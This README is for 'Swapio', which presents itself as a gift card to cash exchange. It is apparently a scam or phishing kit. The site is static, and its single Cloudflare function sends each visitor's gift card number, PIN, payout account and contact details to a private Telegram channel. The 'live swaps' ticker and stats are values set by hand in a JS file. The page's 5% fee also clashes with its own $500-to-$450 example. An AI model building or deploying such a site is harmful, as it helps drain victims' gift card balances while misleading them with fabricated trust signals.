# Swapio

A clean, production-ready static website for **Swapio** — a gift card to cash platform. Built for deployment on [Cloudflare Pages](https://pages.cloudflare.com/) with serverless Telegram logging.

## Project Structure

```
swapio/
├── index.html              # Homepage with swap flow
├── process.html            # How it works
├── faq.html                # FAQ
├── articles.html           # Articles & guides
├── contact.html            # Contact form
├── terms.html              # Terms of Service
├── privacy.html            # Privacy Policy
├── css/
│   └── custom.css          # Custom styles
├── js/
│   ├── shared.js           # Shared components & utilities
│   ├── home.js             # Homepage swap logic
│   └── pages.js            # FAQ accordion, contact form
└── functions/
    └── api/
        └── submit.js       # Cloudflare Pages Function → Telegram
```

## Local Preview

Serve the folder with any static file server:

```bash
cd swapio
npx serve .
```

> **Note:** Form submissions require the Cloudflare Function (`/api/submit`). Local preview will show a network error on submit unless you run Wrangler (see below).

### Local dev with Functions (Wrangler)

```bash
npm install -g wrangler
cd swapio
wrangler pages dev . --compatibility-date=2024-01-01
```

Create a `.dev.vars` file in the project root for local secrets:

```
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHANNEL_ID=your_channel_id_here
```

## Deploy to Cloudflare Pages

> **Important:** Dashboard **zip upload does NOT support Pages Functions.**  
> You will see *"Pages functions are not supported"* and Telegram form logging will not work.  
> Use **Wrangler CLI** (below) or **Git connect** instead.

### Option A: Wrangler CLI (Recommended — no Git needed)

1. Install Wrangler and log in:
   ```bash
   npm install -g wrangler
   wrangler login
   ```

2. Deploy from the `swapio` folder:
   ```bash
   cd swapio
   npm run deploy
   ```
   Or directly:
   ```bash
   wrangler pages deploy . --project-name=swapio
   ```

3. Add Telegram secrets (one-time):
   ```bash
   wrangler pages secret put TELEGRAM_BOT_TOKEN --project-name=swapio
   wrangler pages secret put TELEGRAM_CHANNEL_ID --project-name=swapio
   ```

4. Redeploy after adding secrets:
   ```bash
   npm run deploy
   ```

Your site will be live at `https://swapio.pages.dev` (or your custom domain).

### Option B: Git Integration

1. Push this `swapio/` folder to a GitHub or GitLab repository.
2. [Cloudflare Dashboard](https://dash.cloudflare.com/) → **Workers & Pages** → **Create** → **Pages** → **Connect to Git**.
3. Build settings:
   - **Framework preset:** None
   - **Build command:** (leave empty)
   - **Build output directory:** `/`
4. Add `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHANNEL_ID` under **Settings → Environment variables** (encrypted).
5. Deploy — the `functions/` folder is included automatically.

### Do NOT use: Dashboard zip upload

Zip upload only deploys static files. The `functions/api/submit.js` Telegram handler is ignored and forms will fail.

## Telegram Logging Setup

Form submissions (swap and contact) POST to `/api/submit`, handled by the Cloudflare Pages Function in `functions/api/submit.js`. The function sends a formatted message to your Telegram channel.

### Step 1: Create a Telegram Bot

1. Open Telegram and message [@BotFather](https://t.me/BotFather).
2. Send `/newbot` and follow the prompts.
3. Copy the **bot token** (format: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`).

### Step 2: Create a Channel & Add the Bot

1. Create a new Telegram channel (or use an existing one).
2. Add your bot as an **administrator** with permission to post messages.
3. Get the **channel ID**:
   - Post a message in the channel.
   - Visit `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   - Find `"chat":{"id":-1001234567890}` — that negative number is your channel ID.

### Step 3: Add Secrets to Cloudflare Pages

1. Cloudflare Dashboard → your Pages project → **Settings** → **Environment variables**.
2. Add these as **Encrypted** variables (for both Production and Preview):

| Variable Name         | Value                    |
|-----------------------|--------------------------|
| `TELEGRAM_BOT_TOKEN`  | Your bot token           |
| `TELEGRAM_CHANNEL_ID` | Your channel ID (e.g. `-1001234567890`) |

3. Redeploy the project for changes to take effect.

### Telegram Message Format

Each submission sends a message like:

```
🔄 New Swapio Submission

📋 Order Code: SWP-A3K9F2
📧 Email: user@example.com
👤 Name: Jane Doe

🎁 Card: Amazon — $500
💰 Payout: $450 via PayPal
🏦 Account: jane@paypal.com

🔢 Card Number: 12****90
🔐 PIN: ****

🕐 Submitted: 2026-06-19T14:30:00.000Z
```

## Features

- **7 pages:** Home, Process, FAQ, Articles, Contact, Terms, Privacy
- **Full swap flow:** Searchable brand dropdown (68 brands), balance input, payout selector, offer preview, submission form, success screen with order code
- **5% service fee (95% payout)** shown transparently before submission
- **Cash payouts** — PayPal, Cash App, Zelle, Bank Transfer
- **Responsive design** with Tailwind CSS CDN
- **Live swaps ticker**, stats bar, trust signals, 4-step process
- **Telegram logging** via Cloudflare Pages Functions (secrets never exposed to client)

## Customization

- **Brand colors:** Edit Tailwind config in each HTML file's `<script>` block, or update `css/custom.css`.
- **Gift card list:** Edit `SWAPIO.giftCards` in `js/shared.js`.
- **Service fee:** Change `SWAPIO.serviceFeePercent` in `js/shared.js`.
- **Stats:** Update `SWAPIO.stats` in `js/shared.js`.
- **Articles:** Edit content in `js/articles-data.js`.